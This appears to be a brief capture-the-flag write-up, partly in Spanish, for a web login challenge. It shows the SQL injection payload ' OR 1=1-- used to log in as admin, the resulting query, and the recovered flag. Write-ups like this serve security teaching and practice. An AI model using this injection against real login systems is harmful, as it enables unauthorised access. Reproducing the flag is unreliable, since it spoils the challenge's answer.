#### Description

Can you login to this website?

Additional details will be available after launching your challenge instance.

#### Hints 
1. `admin` is the user you want to login as.



#### Solucion

1. hacemos log in con inyeccion sql "` OR 1=1--"
```
username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'

# Logged in! But can you see the flag, it is in plainsight.
```
2. Inspeccionamos la pagina y revisamos el codigo.
```
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```
